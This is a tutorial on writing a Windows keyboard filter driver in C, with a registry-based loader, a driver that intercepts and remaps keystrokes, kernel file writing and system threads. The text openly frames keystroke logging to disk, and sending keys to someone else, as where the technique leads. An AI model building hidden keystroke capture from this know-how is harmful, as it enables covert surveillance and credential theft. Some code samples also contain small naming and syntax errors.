# Writing a Keyboard Filter - Driver by Vijay Mukhi #
### Part 1
file `y.c`
```c
#include <stdio.h>
#include <windows.h>
#include <malloc.h>
#include <tlhelp32.h>
#include <stdio.h>

#define DRV_NAME "vijayd"
#define DRV_FILENAME "vijay.sys"
#define DIRECTORY "C:\\driverm"

typedef struct {
    unsigned short Length;
    unsigned short MaximumLength;
    char * Buffer;
}
ANSI_STRING, * PANSI_STRING;
typedef struct {
    unsigned short Length;
    unsigned short MaximumLength;
    unsigned short * Buffer;
}
UNICODE_STRING, * PUNICODE_STRING;
long(_stdcall * _RtlAnsiStringToUnicodeString)(PUNICODE_STRING DestinationString, PANSI_STRING SourceString, unsigned char);
VOID(_stdcall * _RtlInitAnsiString)(PANSI_STRING DestinationString, char * SourceString);
long(_stdcall * _ZwLoadDriver)(PUNICODE_STRING DriverServiceName);
long(_stdcall * _ZwUnloadDriver)(PUNICODE_STRING DriverServiceName);
ANSI_STRING aStr;
UNICODE_STRING uStr;
HMODULE hntdll;
unsigned long byteRet;
HANDLE hDevice;
HKEY hkey;
DWORD val, b;
char * imgName = "System32\\DRIVERS\\"
DRV_FILENAME;
void main(int argc, char * argv[]) {
    hntdll = GetModuleHandle("ntdll.dll");
    _ZwLoadDriver = GetProcAddress(hntdll, "NtLoadDriver");
    _ZwUnloadDriver = GetProcAddress(hntdll, "NtUnloadDriver");
    _RtlAnsiStringToUnicodeString = GetProcAddress(hntdll, "RtlAnsiStringToUnicodeString");
    _RtlInitAnsiString = GetProcAddress(hntdll, "RtlInitAnsiString");
    if (strcmp(argv[1], "-i") == 0) {
        CopyFile(DIRECTORY "\\"
            DRV_FILENAME, "C:\\winnt\\system32\\drivers\\"
            DRV_FILENAME, 1);
        RegCreateKey(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Services\\"
            DRV_NAME, & hkey);
        val = 1;
        RegSetValueEx(hkey, "Type", 0, REG_DWORD, (PBYTE) & val, sizeof(val));
        RegSetValueEx(hkey, "ErrorControl", 0, REG_DWORD, (PBYTE) & val, sizeof(val));
        val = 3;
        RegSetValueEx(hkey, "Start", 0, REG_DWORD, (PBYTE) & val, sizeof(val));
        RegSetValueEx(hkey, "ImagePath", 0, REG_EXPAND_SZ, (PBYTE) imgName, strlen(imgName));
        _RtlInitAnsiString( & aStr, "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\"
            DRV_NAME);
        _RtlAnsiStringToUnicodeString( & uStr, & aStr, TRUE);
        val = _ZwLoadDriver( & uStr);
        //hDevice = CreateFile("\\\\.\\"DRV_NAME, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        //printf("Val=%d hDevice=%x",val,hDevice);
        //DeviceIoControl(hDevice, 2 << 3 , argv[2], strlen(argv[2]), 0, 0, &b, 0);
    }
    if (strcmp(argv[1], "-u") == 0) {
        _RtlInitAnsiString( & aStr, "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\"
            DRV_NAME);
        _RtlAnsiStringToUnicodeString( & uStr, & aStr, TRUE);
        _ZwUnloadDriver( & uStr);
        DeleteFile("C:\\winnt\\system32\\drivers\\"
            DRV_FILENAME);
        RegDeleteKey(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Services\\"
            DRV_NAME "\\Enum");
        RegDeleteKey(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Services\\"
            DRV_NAME);
    }
}
```
file `r.c`
```c
#include <ntddk.h>
#include <ntddkbd.h>
PDEVICE_OBJECT pactualkeyboarddevice, pgenericdevice;
UNICODE_STRING uKeyboardDeviceName;
int numPendingIrps;
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload numPendingIrps=%d", numPendingIrps);
    IoDetachDevice(pactualkeyboarddevice);
    while (numPendingIrps > 0)
    ;
    IoDeleteDevice(pgenericdevice);
}
NTSTATUS abcReadOver(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context) {
    PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA) pIrp -> AssociatedIrp.SystemBuffer;
    DbgPrint("abcReadOver ScanCode %d Flags=%x PendingReturned=%d Status=%d\n", keys[0].MakeCode, keys -> Flags, pIrp -> PendingReturned, pIrp -> IoStatus.Status);
    if (keys -> MakeCode == 30)
        keys -> MakeCode++;
    IoMarkIrpPending(pIrp);
    numPendingIrps--;
    return pIrp -> IoStatus.Status;
}
NTSTATUS abcRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    long status;
    IoCopyCurrentIrpStackLocationToNext(pIrp);
    IoSetCompletionRoutine(pIrp, abcReadOver, 0, 1, 0, 0);
    numPendingIrps++;
    status = IoCallDriver(pactualkeyboarddevice, pIrp);
    DbgPrint("abcRead status=%d PendingReturned=%d", status, pIrp -> PendingReturned);
    return status;
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    DbgPrint("Vijay2");
    d -> MajorFunction[IRP_MJ_READ] = abcRead;
    IoCreateDevice(d, 0, 0, FILE_DEVICE_KEYBOARD, 0, 1, & pgenericdevice);
    pgenericdevice -> Flags = pgenericdevice -> Flags | DO_BUFFERED_IO;
    RtlInitUnicodeString( & uKeyboardDeviceName, L "\\Device\\KeyboardClass0");
    IoAttachDevice(pgenericdevice, & uKeyboardDeviceName, & pactualkeyboarddevice);
    d -> DriverUnload = Unload;
    return 0;
}
```
```
abcRead status=259 PendingReturned=0
abcReadOver ScanCode 30 Flags=0 PendingReturned=1 Status=0
abcRead status=259 PendingReturned=0
abcReadOver ScanCode 30 Flags=1 PendingReturned=1 Status=0
abcRead status=259 PendingReturned=0
abcReadOver ScanCode 31 Flags=0 PendingReturned=1 Status=0
abcRead status=259 PendingReturned=0
abcReadOver ScanCode 31 Flags=1 PendingReturned=1 Status=0
abcRead status=259 PendingReturned=0 STATUS_PENDING=259
abcReadOver ScanCode 28 Flags=0 PendingReturned=1 Status=0
abcRead status=259 PendingReturned=0 STATUS_PENDING=259
Driver Unload numPendingIrps=1
abcReadOver ScanCode 28 Flags=1 PendingReturned=1 Status=0
```
The program y.c has no changes at all. Each time we start a new chapter we simply repeat the y.c program even though it has not changed since the last chapter. The program r.c is however totally different. Each time you press the A key from the keyboard in any application, the key s is shown instead. How this magic happens is what this chapter is all about.
Lets start with the DriverEntry program. We set the `MajorFunction` `Read` member to the function `abcRead`. For the nosy ones out there, the macro `IRP_MJ_READ` has a value of 3. Thus each time a read request is send to our driver, the function `abcRead` gets called. The read request in our case will be send when we press a key on the keyboard.
The `IoCreateDevice` function is always used to create a named device. In this case we specify null as our device name. The fourth parameter is the device type. This parameter tells the system on what type of device we would like to model our driver on.
Normally we specify either 0, `FILE_DEVICE_UNKNOWN` or a number that we create bearing in mind that  Microsoft has reserved the first 32767 numbers for themselves. The value of  the macro `FILE_DEVICE_KEYBOARD` is `0xb`. The rest of the parameters are what they always have been and the last is the address of  the device object that just got created. We are modeling ourselves on a keyboard driver. 
The only field of the `DEVICE_OBJECT` structure we set is Flags. There are lots of options here. We only set one bit `DO_BUFFERED_IO`. This flag determines how the I/O manager deals with user buffers when it transfers data to the driver. The other value that can be used is non buffer or `DO_DIRECT_IO` which as the name suggests does not use any buffers at all. 
The driver we create is called a filter driver. We are sitting above the keyboard driver. Thus each time we press a key we get called first, then we pass the request on to the lower driver. This could be the actual keyboard driver or another filter driver. When the lowest level driver handles the request, it gets send up all the way and once again our driver code gets called.

Thus we get called twice, Once in the beginning, once on the way back up. We have to set the Flags field so that it contains the same Flags as the driver below us. We all have to share the same flags or else we get a Blue Screen of Death. It does not make sense for us to use Direct_IO and the lower level driver uses Buffering.
As the actual keyboard driver uses buffering, we use buffering also. Now we need to tell the system, to actually put us into the keyboard loop. Each time a key is pressed our code  in this case the function abcRead. We first create a `UNICODE_STRING` for the keyboard driver whose name is `KeyboardClass0`.
We then use the `IoAttachDevice` which attaches our device that we specify as the first parameter pgenericdevice, the driver object that we created. The second parameter is the name of the device to attach to the keyboard device. The last is a pointer to a `DEVICE_OBJECT` that this function will initialize. It is this pointer that represents the attachment to keyboard driver.
To create a filter driver we have to follow a two stage process. We first create a device and attach this device to the keyboard driver.
The attachment of our driver is at the top of all the existing drivers for the keyboard. Now each time we press a key on the keyboard the abcRead function gets called. We receive a Interrupt Request Packet or IRP which is the heart of passing stuff from one device driver to another.
This structure IRP is extremely large and we will study it in detail. The IRP that we get we need to pass it on to the next lower down driver. This is like a 4 x 100 meter race. Each runner has to pass the baton to the next.
Thus we use a function that has a very large name IoCopyCurrentIrpStackLocationToNext which copies the IRP passed to us to a area of memory which the driver below us will read when it is called after we finish. Thus in the abcRead function we first need to pass the IRP to the next driver.
When the abcRead function is called the IRP is being passed down the line. They could be 10 filter drivers between us and the final keyboard driver. Thus as of now the actual keyboard driver has not been called. After it gets called, the whole process will repeat and the IRP will now move up instead of down.
When the IRP is moving up, the system will need to call a function in us. This function name we specify using the function `IoSetCompletionRoutine`. The first parameter is the all important IRP, the second is the name of the function to be called, abcReadOver, the third is the address of any parameters that we want passed to the function.
The last three we will explain a little later. By calling this function, we know that when the abcReadOver function gets called the keyboard request has been handled by the keyboard driver and the filter drivers sitting above the keyboard driver are now being called.
We increase a variable `numPendingIrps` by 1 as the IRP has not yet got over, it fact it has only started. We now need to actually call the next driver in the chain and we do this be using the function `IoCallDriver`. We pass the actual keyboard device object and not the generic device object.
The IoCallDriver function returns `STATUS_PENDING` or 259 as the request is now being queued up for further processing. The IRP structure has a member `PendingReturned` which has a value `0` and not `1` as the IRP is not pending. This function either returns `STATUS_PENDING` if it is queued up for further processing or the `Status` field of the lower driver.
The request is now passed down to the lowest driver, it then moves up the same path it followed on the way down. The minute the IRP reaches our driver it calls `abcReadOver`. The fact that this function gets called is tells us that we now have access to the key the user pressed. The system has finished extracting the key form the keyboard. How it does it is none of our concern.
All that we know is the IRP pointer has a union `AssociatedIrp` that has a `void *` Pointer `SystemBuffer`. The key that we pressed is stored here. We cast this `void *` pointer into a `KEYBOARD_INPUT_DATA` that looks like.
```c
typedef struct _KEYBOARD_INPUT_DATA {
    USHORT UnitId;
    USHORT MakeCode;
    USHORT Flags;
    USHORT Reserved;
    ULONG ExtraInformation;
} KEYBOARD_INPUT_DATA, *PKEYBOARD_INPUT_DATA;
```
We can use two forms to get at the member of this structure, either `keys[0]` or `keys->`. Theoretically `SystemBuffer` can be a pointer to an array of structures, one per key, we assume it points to only a single key structure. We print out the member MakeCode which give us the scan code of the key pressed. 
The scan code and the ascii code are two different kettles of fish. Each key on the keyboard is given a number depending upon its physical placement. Thus the key a is given a number `30`, the key next to it s is given a number of `31`, etc. The flags member tells us whether the key is **pressed** or **release**. `0` means key press, `1` means key left.
Thus our code gets called twice, once for a key press, once for a key release, The status member is 0 and the PendingReturned member is 1 as the IRP is yet pending, things are not over. If we do not call the function `IoMarkIrpPending`, then the final user program waiting for the keystroke will not receive it and the whole system will hang.
As the IRP is now getting over, the variable numPendingIrps will now be reduced by 1. Thus it will have a value of zero. Remember in function abcRead we increase it by 1, here we reduce it by one because from our perspective the IRP is over. Now we check if the scan code is 30 or a. We increase it by 1 to 31 or s.
Thus each time we press the key a, we see a s instead. Finally the key is placed in the SystemBuffer variable and if any filter driver changes it there, the final user space program will see this value. If the original key pressed was a, and a filter driver before us changed it to b, we would see a b and have no way of knowing what the original key was.
Finally at some point in time we will Unload our driver. We have a small problem as when we write y –u and press enter, our code will get called when the enter key is pressed. This enter key has a scan code of 28 and our functions get called twice, once for key press once for key release.
Thus when you look at the output, the key press for enter gets called, followed by `DriverUnload`. If we remove ourselves now from the list of keyboard filter drivers, the system will yet call us for the return key release. As we have unloaded ourselves, we will get a blue screen of death.
To confirm this the numPendingIrps has a value of 1. So we first Detach our device using function `IoDetachDevice` which is passed the actual device pointer pactualkeyboarddevice. Then we use a empty while loop until variable `numPendingIrps` becomes `0`. Had we placed a `DbgPrint` statement in the `while` loop, it would go on about a 100 times.
Once we get out of the while loop, we no that all pending IRP’s are done and we can safely Delete the original device object created.
### Part 3
```c
NTSTATUS abcRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    long status;
    PIO_STACK_LOCATION curr = IoGetCurrentIrpStackLocation(pIrp);
    PIO_STACK_LOCATION next = IoGetNextIrpStackLocation(pIrp);
    * next = * curr;
    IoSetCompletionRoutine(pIrp, abcReadOver, 0, 1, 0, 0);
    numPendingIrps++;
    status = IoCallDriver(pactualkeyboarddevice, pIrp);
    DbgPrint("abcRead status=%d PendingReturned=%d STATUS_PENDING=%d", status, pIrp -> PendingReturned, STATUS_PENDING);
    return status;
}
```
In this program we display the value of `STATUS_PENDING` which is `259` and also do not use the long function name `IoCopyCurrentIrpStackLocationToNext`. What we instead do is use the familiar function `IoGetCurrentIrpStackLocation` to give us the `IO_STACK_LOCATION` pointer for the current `Irp`.
Each Irp has a stack location as one of its members and the function `IoGetNextIrpStackLocation` give us the stack location of the driver below us or the next driver. Thus curr is the stack data for us and next is the stack data for the driver below us or the one we will call.
We have to copy the data or structure that curr is pointing to, over the data that next is pointing to. If we call our lowed driver now, when he calls `IoGetCurrentIrpStackLocation`, he will get the same value that we got in next. When we say *next we are overwriting the structure that next is pointing to with data from the structure curr is pointing to.
This is how we send our `IO_STACK_LOCATION` structure to the next driver.

### Part 4
file `r.c`
```c
NTSTATUS abcRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    long status;
    PIO_STACK_LOCATION curr = ((pIrp) -> Tail.Overlay.CurrentStackLocation);
    PIO_STACK_LOCATION next = ((pIrp) -> Tail.Overlay.CurrentStackLocation - 1);
    * next = * curr; {
        PIO_STACK_LOCATION _irpSp;
        __irpSp = pIrp -> Tail.Overlay.CurrentStackLocation - 1;
        __irpSp -> CompletionRoutine = abcReadOver;
        __irpSp -> Context = 0;
        __irpSp -> Control = 0;
        if (1) __irpSp -> Control = 0x40;
        if (0) __irpSp -> Control |= 0x80;
        if (0) __irpSp -> Control |= 0x20;
    }
    numPendingIrps++;
    status = IofCallDriver(pactualkeyboarddevice, pIrp);
    DbgPrint("abcRead status=%d PendingReturned=%d STATUS_PENDING=%d", status, pIrp -> PendingReturned, ((NTSTATUS) 0x00000103 L));
    return status;
}
```
One of the things we forget to tell you is that most IO functions are macros. Thus we ran our b.bat file with the cl /P option. What we are showing you is the preprocessed output from r.i.
The macro `IoGetCurrentIrpStackLocation` simply returns the `CurrentStackLocation` member of type `PIO_STACK_LOCATION`. We have a big union Tail that has a structure `Overlay` that has the above member. This member actually points to a series of structures that look like `IO_STACK_LOCATION`.
If we subtract 1 from here we are actually subtracting sizeof `IO_STACK_LOCATION`. This location is  where the next driver will look for its stack. The `IO_STACK_LOCATION` structures for all the drivers are stored back to back.
The `IoSetCompletionRoutine` last three parameters need to be explained. If true or 1, they signify whether the function should be called on completion, error or cancel. By specifying true for the third last parameter only the function will be called only on completion not if the IRP got cancelled or a error happened.
This function is also a macro but breaks up into more code. Lets understand the code generated. A dummy variable __irpSp of type `PIO_STACK_LOCATION` get created first. We set it to the same `CurrentStackLocation` member of the next drivers stack and not the current drivers.
The `IO_STACK_LOCATION` member `CompletionRoutine` we set to the function that needs to be called. The parameter Context is set to zero as we have supplied no context to be passed to the completion function.
The Control member is set to 0 and depending upon which of the last three parameters we have set to 1, a certain bit in the Control flags is set to 1. If the `OnCompletion` parameter is set to 1, the `Control` bit is ORed with `0x40`. As the last two parameters are false, the if statements are false. If they were true, the `Control` member would be ORed with `0x80` and `0x20`.
Thus the set completion function simply tells the next driver which function is to be called, the context to be passed to it and also sets the flags bits. The driver to be called will look at its `IO_STACK_LOCATION` structure to figure out what to do.

### Part 5
file `r.c`
```c
NTSTATUS abcRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    long status; {
        PIO_STACK_LOCATION __irpSp;
        PIO_STACK_LOCATION __nextIrpSp;
        __irpSp = pIrp -> Tail.Overlay.CurrentStackLocation;
        __nextIrpSp = pIrp -> Tail.Overlay.CurrentStackLocation - 1;
        memcpy(__nextIrpSp, __irpSp, (LONG_PTR) & ((IO_STACK_LOCATION * ) 0) -> CompletionRoutine);
        __nextIrpSp -> Control = 0;
    }
    IoSetCompletionRoutine(pIrp, abcReadOver, 0, 1, 0, 0);
    numPendingIrps++;
    status = IofCallDriver(pactualkeyboarddevice, pIrp);
    DbgPrint("abcRead status=%d PendingReturned=%d", status, pIrp -> PendingReturned);
    return status;
}
```

The macro `IoCopyCurrentIrpStackLocationToNext` is somewhat similar to what we had done before. We set two variables to the current stack and the stack of the next driver. Earlier we used pointers to set the stack of the next driver, here we use the function memcpy.
The first parameter is the destination , the second is the source and the third is the number of bytes to copy. We cannot have a pointer that has a value of 0 so all that the above does is give us the distance of the member `CompletionRoutine` from the start.
This has a value of 28 which is the number of bytes we copy. The actual size of the `IO_STACK_INFORMATION` structure is 36 bytes so for some reason the last 8 bytes do not get copied. This is the Context member which is the last and the CompletionRoutine which is the second last member.
`pIrp->Tail.Overlay.CurrentStackLocation->Control |= 0x01;`
When we call the function `IoMarkIrpPending(pIrp)` all that happens is that we set the first bit of the control flag to 1. `Control` is  member of the `IO_STACK_LOCATION` structure. We set this value in our stack so that the OS can see that it needs to pass this IRP to others.
### P6
`r.c`
```c
#include <ntddk.h>
HANDLE hFile;
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
    ZwWriteFile(hFile, 0, 0, 0, 0, "sonal1234", 3, 0, 0);
    ZwClose(hFile);
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    OBJECT_ATTRIBUTES attr;
    UNICODE_STRING uFileName;
    DbgPrint("Vijay2");
    RtlInitUnicodeString( & uFileName, L "\\DosDevices\\c:\\driverm\\z.txt");
    InitializeObjectAttributes( & attr, & uFileName, OBJ_CASE_INSENSITIVE, 0, 0);
    ZwCreateFile( & hFile, GENERIC_WRITE, & attr, 0, 0, 0, 0, 0, FILE_SYNCHRONOUS_IO_NONALERT, 0, 0);
    ZwWriteFile(hFile, 0, 0, 0, 0, "Vijay", 5, 0, 0);
    d -> DriverUnload = Unload;
    return 0;
}
```
output `VijaySon`
Now we will take a short break from writing a filter driver and move on to other things. These other things will later on be incorporated into writing the worlds most complete keyboard filter driver. One of the things our filter driver has to do is write the keys we press on a file on disk.
If this driver was a bad un, it would send our keystrokes to someone else. To do this it would have to write the keys on a file on disk and then periodically send them out. To write to a file we first need to create a File handle using the `ZwCreateFile` function. 
This function takes a zillion parameters and most of them are null or zero so we will not explain them. At times we believe we would be able to write a encyclopedia on these options. The first parameter is a address of a file handle that will be initialized by the function that we will use later to identify the file created.
The second parameter is the type of access that the driver needs for the file or directory to be created. It is also called the `ACCESS_MASK`. When we use `GENERIC_WRITE` this is actually many right in one.
These are `STANDARD_RIGHTS_WRITE`, `FILE_WRITE_DATA`, `FILE_WRITE_ATTRIBUTES`, `FILE_WRITE_EA`, and `FILE_APPEND_DATA`. The other generic masks that we can use are `GENERIC_READ` and `GENERIC_EXECUTE`.
These are rights that the driver needs for the file, the system needs to know so that we do not create a security problem with system objects. We use the same function to create a directory also.
The third parameter we thought would be the name of the file to create. Unfortunately it is the address of a structure of type `OBJECT_ATTRIBUTES`. In the driver world everything is an object. We have to first create a `UNICODE_STRING` that represents the name of the file.
We end this string with the file name `C:\\driversm\\z.txt`. We have to preface this name with `DosDevices`. This is part of syntax. Some people have a aversion to `DosDevices`, these people can use `??` instead. Thus we could have also used the string `\\??\\c:\\driverm\\z.txt`.
This explains the `??` that we saw when we displayed the names of device drivers. We use the good old `RtlInitUnicodeString` to create a unicode string and then use the function or macro `InitializeObjectAttributes` to initialize the object structure. The first parameter is the address of this structure, the second is the Unicode string.
This macro initializes what the docs call a opaque structure `OBJECT_ATTRIBUTES`. The reason they call it opaque is because they do not document it. This structure is used as a name for all function that open handles like `ZwCreateFile`.  The third parameter is the flags parameter.
There will be a need to compare the unicode name that we have supplied with names of objects already existing. The flags option that we have used lets the system do a case insensitive comparison. The default system setting for comparisons is case sensitive. Thus the attr structure now stands for the name of our file which we will use instead of the file name.
The next parameter we specify is called the `CreateOptions`. The value `FILE_SYNCHRONOUS_IO_NONALERT` tells the system that all file operations like read and write should be performed in a synchronous way. Everybody wais until the file operation is done.
In a asynchronous operation, when the operation is done nobody knows but we are notified when it gets over.  Obviously people will have to wait for the file operations to be done, no alerts are generated due to this wait. The system maintains the file pointer or position context.
Finally we use the `ZwWriteFile` to write to this file. We specify the string or better still the area of memory. If it is string, we use ascii and not unicode.  Then we specify the length or the number of bytes to be written. In the `DriverUnload` function we again write to the file. If we do not close the file using ZwClose, we are not allowed to  read the file in ring 3. The system locks the file unless we reboot.

```c
#include <ntddk.h>
HANDLE hFile;
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
    ZwWriteFile(hFile, 0, 0, 0, 0, "sonal1234", 5, 0, 0);
    ZwClose(hFile);
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    OBJECT_ATTRIBUTES attr;
    UNICODE_STRING uFileName;
    DbgPrint("Vijay2");
    RtlInitUnicodeString( & uFileName, L "\\??\\c:\\driverm\\z.txt");
    attr.Length = sizeof(OBJECT_ATTRIBUTES);
    ( & attr) -> RootDirectory = 0;
    ( & attr) -> Attributes = 0x00000040 L;
    ( & attr) -> ObjectName = & uFileName;
    ( & attr) -> SecurityDescriptor = 0;
    ( & attr) -> SecurityQualityOfService = (void * ) 0;
    ZwCreateFile( & hFile, GENERIC_WRITE, & attr, 0, 0, 0, 0, 0, FILE_SYNCHRONOUS_IO_NONALERT, 0, 0);
    ZwWriteFile(hFile, 0, 0, 0, 0, "Vijay", 5, 0, 0);
    d -> DriverUnload = Unload;
    return 0;
}
```
In the last example we spoke about the macro `InitializeObjectAttributes`. The above example breaks up the macro for us.  The structure `OBJECT_ATTRIBUTES` has 6 members, the function has 6 members.
All that it does is initializes the six members for us. The only difference is that it use the address of the structure to set the members, we prefer using the name. One function/macro that serves no useful purpose at all.
This is how we write to a file from our device driver. Someday we will explain all the other parameters also.

### P7
`r.c`
```c
#include <ntddk.h>
void abc(void * p) {
    DbgPrint("abc");
}
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    HANDLE hThread;
    DbgPrint("Vijay2");
    d -> DriverUnload = Unload;
    PsCreateSystemThread( & hThread, 0, 0, 0, 0, abc, 0);
    DbgPrint("After Thread");
    return 0;
}
```
output
```
Vijay2
After Thread
abc
Driver Unload
```
We create a thread using the function `PsCreateSystemThread`. The first parameter is the handle to the thread which the function will initialize. We will use this handle to refer to our thread in future. The second last parameter is the function that will be called by our thread `abc`.
If you see the output, the system first executes all the code in `DriverEntry`  and then executes the code in the abc function. Windows gives time slices not to programs but to threads. Thus the more the threads we create the more attention or time we get.
### P8
r.c
```c
#include <ntddk.h>
#include <malloc.h>
void abc(void * p) {
    DbgPrint("abc %d %x", *(int * ) p, p);
}
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    HANDLE hThread;
    int * p;
    d -> DriverUnload = Unload;
    p = (int * ) ExAllocatePool(PagedPool, 4);
    * p = 21;
    DbgPrint("Vijay2 %x", p);
    PsCreateSystemThread( & hThread, 0, 0, 0, 0, abc, p);
    return 0;
}
```
```
Vijay2 e303c188
abc 21 e303c188
Driver Unload
```
The next program passes a pointer or a context to our thread. We use the now familiar function ExAllocatePool to allocate memory for us. The first parameter pool type is not important, the second is the number of bytes of memory to allocate. We ask for space to store an `int` 4 bytes.
We set these bytes to `21`. We then pass this variable `p` whose address happens to be  `e303c188`. This number is random and there is one chance in a billion that you will get this same value. The function `abc` that gets called by our thread is passed this same pointer.
When we display the `int` stored here we get the same value `21`. This is how a thread can get passed a context. If the thread changes the memory it gets, we will also see the change.

### Part 9
`r.c`
```c
#include <ntddk.h>
#include <malloc.h>
void abc(void * p) {
    DbgPrint("abc %x %x", PsGetCurrentThreadId(), PsGetCurrentThread());
}
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    HANDLE hThread;
    int i;
    d -> DriverUnload = Unload;
    DbgPrint("Vijay2 %x %x", PsGetCurrentThreadId(), PsGetCurrentThread());
    PsCreateSystemThread( & hThread, 0, 0, 0, 0, abc, 0);
    return 0;
}
```
```
Vijay2 38 8202d3a0
abc 114 81993760
Driver Unload
```
We use the function `PsGetCurrentProcess` extensively in the past. We now use the similar `PsGetCurrentThread` to give us a pointer to a `ETHREAD` structure. DriverEntry runs in its own thread and abc runs in a different thread. This is why `PsGetCurrentThread` returns a different value in the two functions.

### P9a
`r.c`
```c
#include <ntddk.h>
#include <malloc.h>
void abc(void * p) {
    DbgPrint("abc %x", PsGetCurrentThread());
}
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    HANDLE hThread, ThreadObj;
    PsCreateSystemThread( & hThread, 0, 0, 0, 0, abc, 0);
    ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, 0, KernelMode, & ThreadObj, 0);
    DbgPrint("ThreadObj=%x", ThreadObj);
    d -> DriverUnload = Unload;
    return 0;
}
```
```
ThreadObj=819d6da0 hThread=108
abc 819d6da0
Driver Unload
```
The above program creates a thread handle `hThread` whose value is 108.  The function `PsGetCurrentThread` in the abc function returns a value of `819d6da0`. It is this value that we need to use whenever we are dealing with the thread. Thus we need a way to convert one handle to another.
The function `ObReferenceObjectByHandle` is just what the doctor ordered. We first specify the thread handle that we have and pass the address of a handle. This variable is filled up with the actual `ETHREAD` address `819d6da0`.
Thus this function first validates access to the handle and then if we can get access returns a actual pointer by which we can access the body of the object which in the threads case is its `ETHREAD` structure.
The second parameter is the access we require, this will depend upon the type of handle we pass. The next is the object type which if the Access mode is kernel can be null. The access mode which is the next parameter can be user or kernel as always.

### P10
`r.c`
```c
#include <ntddk.h>
#include <malloc.h>
void abc(void * p) {
    int i;
    for (i = 0; i <= 10; i++)
        DbgPrint("abc %d", i);
}
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    HANDLE hThread;
    int i;
    d -> DriverUnload = Unload;
    DbgPrint("Vijay2");
    PsCreateSystemThread( & hThread, 0, 0, 0, 0, abc, 0);
    DbgPrint("After Thread");
    return 0;
}
```
```
Vijay2
After Thread
abc 0
abc 10
Driver Unload
```
The above program demonstrates that even though the thread prints out abc 10 times, the system first finishes the `DriverEntry` and then executes the code of the thread. No matter how much code we place in the DriverEntry program, the system first executes all of it.
We went to the extent of placing a for loop that went on a 1000 times, the system first executed the `DriverEntry` and then the thread. Lets change this.
### P11
r.c
```
#include <ntddk.h>
#include <malloc.h>
KSEMAPHORE sem;
void abc(void * p) {
    int i;
    for (i = 0; i <= 10; i++)
        DbgPrint("abc %d", i);
    KeReleaseSemaphore( & sem, 0, 1, FALSE);
}
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    HANDLE hThread;
    int i;
    d -> DriverUnload = Unload;
    DbgPrint("Vijay2 %d", MAXLONG);
    KeInitializeSemaphore( & sem, 0, MAXLONG);
    PsCreateSystemThread( & hThread, 0, 0, 0, 0, abc, 0);
    DbgPrint("After Thread Before Wait");
    KeWaitForSingleObject( & sem, Executive, KernelMode, 0, 0);
    DbgPrint("After Thread After Wait");
    return 0;
}
```
```
Vijay2 2147483647
After Thread Before Wait
abc 0
abc 10
After Thread After Wait
Driver Unload
```
If we look at the output first we will see that first the thread finishes and then the DriverEntry function. Lets explain how this happened. We start with a function `KeInitializeSemaphore` which initializes a object called a semaphore sem.  A `KSEMAPHORE` object is nothing but a structure with two members.
The second parameter is the initial value of the semaphore which is 0. Thus the semaphore is said to be in the non signaled state. We can assume in our minds that a semaphore is a global variable with a value. The last parameter is MAXLONG a hash define for the maximum value a long can take `0x7fffffff`. This is the largest value the semaphore can have.
Thus we have created a variable sem that has a value of `0`. The `KeWaitForSingleObject` is a function that lets us wait for some event to happen. While we are waiting, no machine cycles are being wasted. This waiting is not like waiting on a empty for loop where we are using machine resources.
The system puts the thread to sleep and when the event occurs, the thread is woken up and the next line after the Wait function gets called. The first parameter is what do we wait for. As we have specified our semaphore object, the system will wait until the semaphore value becomes 1 or more. Right now its value is zero.
The second parameter can take many values as it is an enum but we normally use one of two values, Executive or UserRequest. This parameter tells the system why are we waiting. A user may create a thread and we are doing word for that user, we set the value to UserRequest.  
Most of the time we will use `Executive`. The third parameter is the wait mode which can be `UserMode` or `KernelMode`. The other parameter we will do later. Thus we will wait for ever at this wait unless someone sets the semaphore to `1`. Thus the last `DbgPrint` in `DriverEntry` does not get called.
In the `abc` function we first display something in a loop and at the end we use the function `KeReleaseSemaphore` to change the value of the semaphore sem. The third parameter is how much we increase the value of the semaphore by, in our case by 1.
The last parameter being false specifies that there is not Wait function following this function.
Thus as we have changed the value of the semaphore to 1, the Wait function moves on and the semaphore value becomes 0 again. Normally if it has a value 0, it is said to be in a non-signaled state, 1 means signaled.
We make a small change to our program as follows.
`KeInitializeSemaphore(&sem,1,MAXLONG);`
